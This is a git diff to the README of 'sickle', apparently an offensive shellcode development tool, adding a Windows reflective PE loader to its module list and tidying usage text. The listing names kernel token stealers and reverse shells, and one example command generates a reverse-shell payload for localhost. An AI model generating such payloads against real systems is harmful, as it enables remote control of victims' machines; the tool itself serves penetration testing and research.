@@ -76,7 +76,8 @@ $ sickle -l
   windows/x64/kernel_token_stealer                                                 Kernel token stealing shellcode
   windows/x64/kernel_sysret                                                        Generic method of returning from kernel space to user space
   windows/x64/kernel_ace_edit                                                      Kernel shellcode to modify the _SECURITY_DESCRIPTOR of a process
-  windows/x64/shell_reverse_tcp                                                    A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe session
+  windows/x64/reflective_pe_tcp                                                    TCP-based reflective PE loader over IPV4 which executes a PE from a remote server
+  windows/x64/shell_reverse_tcp                                                    TCP-based reverse shell over IPv4 that provides an interactive cmd.exe session
   windows/x86/kernel_token_stealer                                                 Kernel token stealing shellcode
   linux/aarch64/memfd_reflective_elf_tcp                                           TCP-based reflective ELF loader over IPV4 which executes an ELF from a remote server
   linux/aarch64/shell_reverse_tcp                                                  TCP-based reverse shell over IPV4 that provides an interactive /bin/sh session
@@ -118,7 +119,7 @@ $ sickle -l
 This approach allows each module the ability to generate detailed documentation for its functionality.
 
 ```
-$ sickle -i -m run                            
+$ sickle -m run -i
 
 Usage information for run
 
@@ -139,12 +140,12 @@ Description:
     
     Executes bytecode from a binary file (-r) or a payload module (-p) under the
     context of the currently running operating system and architecture. Meaning if
-    you are running on AARCH64 bytecode will be interpreted as such and if your on
-    x64 it will interpret it as x64 respectively.
+    you are running on AARCH64 bytecode will be interpreted as such and if you're
+    on x64 it will interpret it as x64 respectively.
     
 Example:
 
-    sickle.py -m run -r shellcode
+    /usr/local/bin/sickle -m run -r shellcode
 ```
 
 This approach also includes documentation for shellcode stubs.
@@ -181,5 +182,5 @@ Description:
     
 Example:
 
-    src/sickle.py -p linux/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c
+    /usr/local/bin/sickle -p linux/aarch64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c
 ```
